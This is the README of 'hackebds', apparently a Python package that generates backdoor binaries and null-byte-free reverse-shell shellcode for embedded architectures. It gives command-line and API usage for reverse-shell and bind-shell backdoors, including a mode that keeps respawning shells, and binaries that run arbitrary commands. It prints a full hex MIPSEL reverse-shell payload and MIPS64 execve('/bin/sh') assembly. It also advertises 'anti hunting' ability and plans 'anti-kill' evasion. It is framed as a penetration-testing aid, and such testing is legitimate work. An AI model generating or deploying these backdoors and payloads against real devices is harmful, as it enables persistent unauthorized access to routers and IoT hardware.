# hackebds
![PyPI - Wheel](https://img.shields.io/pypi/wheel/hackebds)![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwntools)
[![Downloads](https://static.pepy.tech/badge/hackebds)](https://pepy.tech/project/hackebds)

:link:[中文readme](https://github.com/doudoudedi/hackEmbedded/blob/main/readme_cn.md)

## foreword

>In the process of penetration and vulnerability mining of embedded devices, many problems have been encountered. One is that some devices do not have telnetd or ssh services to obtain an interactive shell，Some devices are protected by firewall and cannot be connected to it in the forward direction Reverse_shell is required, and the other is that memory corruption vulnerabilities such as stack overflow are usually Null bytes are truncated, so it is more troublesome to construct reverse_shellcode, so this tool was developed to exploit the vulnerability. This tool is developed based on the PWN module and currently uses the python2 language，**Has been updated to python3**



## fuction


This tool is embedded in the security test of the device. There are two main functions:

1.  Generate **backdoor programs** of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal，Pure static backdoor .**Armv5, Armv7, Armv8, mipsel, mips，mips64，mipsel64，powerpc, powerpc64，sparc,sparc64  are now supported, and they are still being updated** (PS:bash support is added to the reverse shell after version 0.3.1). If the backdoor of the reverse shell is generated with the - power parameter, the reverse shell will continue to be generated on the target machine)
2.  Generate **reverse_shell shellcode** of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips, mips64, mipsel64, powerpc, powerpc64，sparc  are now supported, and they are still being updated**
3.  Generate bind of various architectures bind_Shell file.
4.  Support command line generation backdoor and shell code, Strong anti hunting ability,characterized by light, small, efficient and fast


## install

Just use pip to install, if the installation fails, try to use sudo to install

```
pip(3) install -U hackebds
```
（If you want this tool to run on a MacOS system, you need to include python/bin in the bashrc environment variable）
```
echo 'export PATH="/Users/{you id}/Library/Python/{your installed python}/bin:$PATH"'>> ~/.bashrc
```
![image-20221125095653018](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221125095653018.png)


![image-20221121142622451](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221121142622451.png)

#### Instructions for use

![image-20221118202002242](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221118202002242.png)

Please install the corresponding binutils environment before use
expample:

```
Ubuntu（debian）:
  apt search binutils | grep arm（You can replace it here， if not please execute "apt update" first）
  apt install binutils-arm-linux-gnueabi/hirsute
 MacOS:
 	 https://github.com/Gallopsled/pwntools-binutils
 	 brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
```

1. Use the command line to generate the backdoor file name, shellcode, bindshell, etc

   ![image-20221206180431454](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png)

   ```
   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
   ```

   ![image-20221102181217933](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png)
   ```
   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
   ```
   By default, the reverse shell backdoor is created using sh. If bash is required (PS: here, the bash command needs to exist on the target device)
   
   ```
   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash
   ```
   
   If you need to generate a backdoor and constantly create reverse shells (the CPU occupied by the test is about% 8)
   
   ```
   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
   ```
   
   
   
   ![image-20221102183017775](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png)
   
   ```
   hackebds -bind_port 8080 -passwd 1234 -arch mips -model DIR-823 -res bind_shell
   ```
   Create bind_shell to monitor the shell as sh, -power fuction can give -shell bash	
   
   ```
   hackebds -bind_port 8081 -arch armelv7 -res bind_shell -passwd 1231 -power
   ```
   
   The bind_shell process will not stop after being disconnected, and supports repeated connections (currently this function is not supported by powerpc and sparc series)
   
   ![image-20221102182939434](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102182939434.png)
   
   
   
   Generate cmd_file function is updated. Only need to specify the - cmd parameter to generate programs for various architectures to execute corresponding commands , -envp Environment variables are separated by commas
   
   ```
   hackebds  -cmd "ls -al /" -arch powerpc  -res cmd_file
   ```
   
   ![image-20230106153510332](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153510332.png)
   
   The list relationship between the output model and the architecture is added to the function of generating the backdoor for the specified model, which is convenient for observation and modification
   
   ```
   hackebds -l
   ```
   
   ![image-20230116204717279](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230116204717279.png)
   
   ![image-20230106153942787](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153942787.png)
   
2. Generate backdoor programs of various architectures, encapsulate pure shellcode, and successfully connect to the shell

```
>>> from hackebds import *
>>> mipsel_backdoor(reverse_ip,reverse_port)
>>> mips_backdoor(reverse_ip,reverse_port)
>>> aarch64_backdoor(reverse_ip,reverse_port)
>>> armelv5_backdoor(reverse_ip,reverse_port)
>>> armelv7_backdoor(reverse_ip,reverse_port)
>>> armebv5_backdoor(reverse_ip,reverse_port)
>>> armebv7_backdoor(reverse_ip,reverse_port)
>>> mips64_backdoor(reverse_ip,reverse_port)
>>> mips64el_backdoor(reverse_ip,reverse_port)
>>> x86el_backdoor(reverse_ip,reverse_port)
>>> x64el_backdoor(reverse_ip, reverse_port)
>>> sparc32.sparc_backdoor(reverse_ip, reverse_port)#big endian
>>> sparc64.sparc_backdoor(reverse_ip, reverse_port)#big endian
>>> powerpc_info.powerpc_backdoor(reverse_ip, reverse_port)
>>> powerpc_info.powerpcle_backdoor(reverse_ip, reverse_port)
>>> powerpc_info.powerpc64_backdoor(reverse_ip, reverse_port)
>>> powerpc_info.powerpc64le_backdoor(reverse_ip, reverse_port)
>>> x86_bind_shell(listen_port, passwd)
>>> x64_bind_shell(listen_port, passwd)
>>> armelv7_bind_shell(listen_port, passwd)
>>> aarch64_ bind_ shell(listen_port, passwd)
>>> mips_bind_shell(listen_port, passwd)
>>> mipsel_bind_shell(listen_port, passwd)
>>> sparc32.sparc_bind_shell(listen_port, passwd)
>>> powerpc_info.powerpc_bind_shell(listen_port, passwd)
```

（Note that the maximum password length is 4 characters for x86（32bits） and 8 characters for x64（64bits））

```
>>> mipsel_backdoor("127.0.0.1",5566)
[+] reverse_ip is: 127.0.0.1
[+] reverse_port is: 5566
[*] waiting 3s
[+] mipsel_backdoor is ok in current path ./
>>>
```

![image-20221028144512270](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144512270.png)

```
>>> from hackebds import *
>>> x86_bind_shell(4466,"doud")
[+] bind port is set to 4466
[+] passwd is set to 'doud'
0x0000000064756f64
[*] waiting 3s
[+] x86_bind_shell is ok in current path ./
>>>
```

![image-20221028143802937](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028143802937.png)

Then connect to the port bound to the device (password exists)

![image-20221028144136069](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144136069.png)

2. Generates the use-back shellcode (no free) null bytes corresponding to various architectures

```
>>> from hackebds import *
>>> mipsel_reverse_sl(reverse_ip,reverse_port)
>>> mips_reverse_sl(reverse_ip,reverse_port)
>>> aarch64_reverse_sl(reverse_ip,reverse_port)
>>> armelv5_reverse_sl(reverse_ip,reverse_port)
>>> armelv7_reverse_sl(reverse_ip,reverse_port)
>>> armebv5_reverse_sl(reverse_ip,reverse_port)
>>> armebv7_backdoor(reverse_ip,reverse_port)
>>> mips64_reverse_sl(reverse_ip,reverse_port)
>>> mips64el_reverse_sl(reverse_ip,reverse_port)
>>> android_aarch64_backdoor(reverse_ip,reverse_port)
>>> x86el_reverse_sl(reverse_ip,reverse_port)
>>> x64el_reverse_sl(reverse_ip,reverse_port)
>>> powerpc_info.ppc_reverse_sl(reverse_ip,reverse_port)
>>> powerpc_info.ppcle_reverse_sl(reverse_ip,reverse_port)
>>> powerpc_info.ppc64_reverse_sl(reverse_ip,reverse_port)
>>> powerpc_info.ppc64le_reverse_sl(reverse_ip,reverse_port)
```

example:

```
>>> from hackebds import *
>>> shellcode=mipsel_reverse_sl("127.0.0.1",5566)
[+] No NULL byte shellcode for hex(len is 264):
\xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
```
3. Added that shellcode for calling execve cannot be generated in shellcraft (change context generate mips64(el), powerpc shell code for execve("/bin/sh",["/bin/sh"]),0))

   ```
   >>> from hackebds import *
   >>> test = ESH()
   [*] arch is i386
   [*] endian is little
   [*] bits is 32
   >>> test.sh()
   [*] Please set correct assembly schema information(pwerpc or mips64(el))
   >>> context.arch = 'mips64'
   >>> test.sh()
   "\n\t\t\t/* execve(path='/bin/sh', argv=['sh'], envp=0) */\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1, -8($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -8\n\t\t\tdadd     $a0, $sp, $zero\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1,-12($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -8($sp)\n\t\t\tsw      $zero, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -12\n\t\t\tslti    $a1, $zero, -1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tli      $t9, -9\n\t\t\tnor     $a1, $t9, $zero\n\t\t\tdadd     $a1, $sp, $a1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tdadd     $a1, $sp, $zero\n\t\t\tslti    $a2, $zero, -1\n\t\t\tli      $v0, 0x13c1\n\t\t\tsyscall 0x40404\n\t\t\t"
   >>> test.sh()
   
   ```

## chips and architectures

Tests can leverage chips and architectures

Mips:
MIPS 74kc V4.12 big endian,
MIPS 24kc V5.0  little endian (Ralink SoC)
Ingenic Xburst V0.0  FPU V0.0  little endian

Armv7:
Allwinner(全志)V3s

Armv8:
Qualcomm Snapdragon 660
BCM2711

Powerpc, sparc: qemu


## :beer:enjoy hacking(happy Chinese new Year!)


## updating

 2022.4.19 Added support for aarch64 null-byte reverse_shellcode

 2022.4.30 Reduced amount of code using functions and support python3

 2022.5.5 0.0.8 version Solved the bug that mips_reverse_sl and mipsel_reverse_sl were not enabled, added mips64_backdoor, mips64_reverse_sl generation and mips64el_backdoor, mips64el_reverse_sl generation

 2022.5.21 0.0.9 version changed the generation method of armel V5 backdoor and added the specified generation of riscv-v64 backdoor

 2022.6.27 0.1.0 Added Android backdoor generation

 2022.10.26 0.1.5 Fixed some problems and added some automatic generation functions of bindshell specified port passwords

 2022.10.27 0.1.6 Add support armv7el_bind_shell(2022.10.27)

 2022.11.1 Removed the generation sleep time of shellcode, and added mips_ bind_ Shell, reverse of x86 and x64 small end_ shell_ Backdoor, the mips that are expected to be interrupted by mips_ bind_ Shell, which solves the error of password logic processing in the bindshell in mips

 2022.11.2 Joined aarch64_ bind_ shell
 2022.11.2 Support command line generation backdoor and shell code, characterized by light, small, efficient and fast

 2022.12.6 0.2.8 Add sparc_bind_shell && powerpc_bind_shell ，fix some bug

 2022.12.26 0.2.9 Added the program function of generating specified commands, and added executable permissions after generating files

 2023.1.6 0.3.0 repaired cmd_ The file generates the function bug of executing the specified command program, and adds the model ->arch list, Android bind_ Shell file

 2023.1.16 0.3.1 Added bash reverse_ Shell. At present, this tool only supports sh and bash. The - l function is added to list the relationship between device model and architecture, and the - power function is added to generate a more powerful reverse_ shell_ File, which realizes the continuous creation of reverse shell links without killing the program. Currently, the - power function only supports reverse_ shell_ file

 2023.1.29 0.3.3 -The power function adds support for bind_shell, bind_shell is more stable, and fixes some bugs in the execution of bind_shell and cmd_file files of the aarch64 architecture

## Problems to be solved

Support the backend of the loongarch64 architecture and the generation of the bind_shell program (binutils has been integrated into the mainline, but cannot be installed directly through apt)

Improve the generation of power_bind_shell backdoors of powerpc and sparc series

Add anti-kill function for backdoor programs



## vul fix


CVE-2021-29921 The tool is a complete client program. This vulnerability will not affect the use of the tool. If you want to fix it, please run the tool in python 3.9 and above

CVE-2022-40023 DOS_attack pip install -U  mako (The vulnerability does not apply to this tool)

CVE-2021-20270 DOS_attack pip install -U  pygments (The vulnerability does not apply to this tool)

 0.2.5 Version Repair directory traversal in the specified model

 ## Verion List

| VERSION                                                      | PUBLISHED    | DIRECT VULNERABILITIES |
| ------------------------------------------------------------ | ------------ | ---------------------- |
| [0.3.2](https://security.snyk.io/package/pip/hackebds/0.3.2) | 18 Jan, 2023 | 0C0H0M0L               |
| [0.3.1](https://security.snyk.io/package/pip/hackebds/0.3.1) | 16 Jan, 2023 | 0C0H0M0L               |
| [0.3.0](https://security.snyk.io/package/pip/hackebds/0.3.0) | 6 Jan, 2023  | 0C0H0M0L               |
| [0.2.9](https://security.snyk.io/package/pip/hackebds/0.2.9) | 26 Dec, 2022 | 0C0H0M0L               |
| [0.2.8](https://security.snyk.io/package/pip/hackebds/0.2.8) | 6 Dec, 2022  | 0C0H0M0L               |
| [0.2.7](https://security.snyk.io/package/pip/hackebds/0.2.7) | 22 Nov, 2022 | 0C0H0M0L               |
| [0.2.3](https://security.snyk.io/package/pip/hackebds/0.2.3) | 15 Nov, 2022 | 0C0H0M0L               |
| [0.2.2](https://security.snyk.io/package/pip/hackebds/0.2.2) | 8 Nov, 2022  | 0C0H0M0L               |
| [0.2.1](https://security.snyk.io/package/pip/hackebds/0.2.1) | 7 Nov, 2022  | 0C0H0M0L               |
| [0.2.0](https://security.snyk.io/package/pip/hackebds/0.2.0) | 2 Nov, 2022  | 0C0H0M0L               |
| [0.1.9](https://security.snyk.io/package/pip/hackebds/0.1.9) | 2 Nov, 2022  | 0C0H0M0L               |
| [0.1.6](https://security.snyk.io/package/pip/hackebds/0.1.6) | 27 Oct, 2022 | 0C0H0M0L               |
| [0.1.5](https://security.snyk.io/package/pip/hackebds/0.1.5) | 26 Oct, 2022 | 0C0H0M0L               |
| [0.1.3](https://security.snyk.io/package/pip/hackebds/0.1.3) | 27 Jun, 2022 | 0C0H0M0L               |
| [0.1.2](https://security.snyk.io/package/pip/hackebds/0.1.2) | 27 Jun, 2022 | 0C0H0M0L               |
| [0.1.1](https://security.snyk.io/package/pip/hackebds/0.1.1) | 27 Jun, 2022 | 0C0H0M0L               |
| [0.0.9](https://security.snyk.io/package/pip/hackebds/0.0.9) | 21 May, 2022 | 0C0H0M0L               |
| [0.0.8](https://security.snyk.io/package/pip/hackebds/0.0.8) | 5 May, 2022  | 0C0H0M0L               |
| [0.0.7](https://security.snyk.io/package/pip/hackebds/0.0.7) | 30 Apr, 2022 | 0C0H0M0L               |
| [0.0.6](https://security.snyk.io/package/pip/hackebds/0.0.6) | 30 Apr, 2022 | 0C0H0M0L               |
| [0.0.5](https://security.snyk.io/package/pip/hackebds/0.0.5) | 29 Apr, 2022 | 0C0H0M0L               |
| [0.0.4](https://security.snyk.io/package/pip/hackebds/0.0.4) | 29 Apr, 2022 | 0C0H0M0L               |
| [0.0.3](https://security.snyk.io/package/pip/hackebds/0.0.3) | 29 Apr, 2022 | 0C0H0M0L               |
| [0.0.2](https://security.snyk.io/package/pip/hackebds/0.0.2) | 29 Apr, 2022 | 0C0H0M0L               |
| [0.0.1](https://security.snyk.io/package/pip/hackebds/0.0.1) | 29 Apr, 2022 | 0C0H0M0L               |
